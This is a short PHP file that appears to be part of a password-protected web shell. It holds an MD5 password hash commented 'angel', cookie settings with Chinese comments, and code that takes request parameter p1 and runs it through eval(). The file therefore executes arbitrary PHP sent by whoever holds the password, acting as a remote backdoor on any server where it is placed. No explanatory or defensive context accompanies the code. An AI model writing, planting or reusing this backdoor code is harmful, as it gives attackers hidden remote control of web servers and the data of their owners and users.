<?php
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
// cookie 前缀
$cookiepre = '';
// cookie 作用域
$cookiedomain = '';
// cookie 作用路径
$cookiepath = '/';
// cookie 有效期
$cookielife = 86400;

for ($i=1;$i<=4;$i++) {
	${'p'.$i} = isset($P['p'.$i]) ? $P['p'.$i] : '';
}

$phpcode = trim($p1);
$phpcode = "<?php\n\n{$phpcode}\n\n?>";
eval("?".">$phpcode<?");
?>